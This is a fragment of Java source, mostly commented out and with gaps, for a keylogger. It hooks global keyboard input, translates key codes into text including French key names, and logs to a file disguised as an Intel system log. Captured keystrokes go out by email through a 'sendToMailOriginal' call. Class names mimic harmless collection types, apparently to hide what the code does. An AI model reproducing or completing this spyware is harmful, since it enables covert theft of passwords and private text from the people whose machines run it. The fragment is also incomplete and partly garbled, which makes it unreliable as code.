 ...
 *
 */
public class Map_Tree_M {
//public class Map_Tree_M implements NativeKeyListener {
...
//	private static final File file = new File("C:/Intel/Logs/native64_lockx01.sc");
...
//			System.exit(1);
//		}
//		GlobalScreen.getInstance().addNativeKeyListener(new Map_Tree_M());
	}
...
//						this.keyText = String.valueOf(Hash_Set_Std
//								.getKeyByKeyCode(e.getKeyCode(), this.shiftDown.booleanValue(), false).getCharacter());
//					} else if ((!this.shiftDown.booleanValue())
//							&& (Hash_Set_Std.getKeyByKeyCode(e.getKeyCode(), false, false) != null)) {
//						this.keyText = String
//								.valueOf(Hash_Set_Std.getKeyByKeyCode(e.getKeyCode(), false, false).getCharacter());
...
//				}
//			}
//			if (this.keyText.contains("Pav� num�rique")) {
//				this.keyText = this.keyText.replace("Pav� num�rique", "").trim();
//			}
//			if (this.keyText.contains("Retour arri�re")) {
//				this.keyText = this.keyText.replace("Retour arri�re", "/BackSpace/").trim();
//			}
//			if (e.getKeyCode() == 16) {
//				this.keyText = "";
//			}
...
//				Tree_Set_Sen.sendToMailOriginal(toSend);
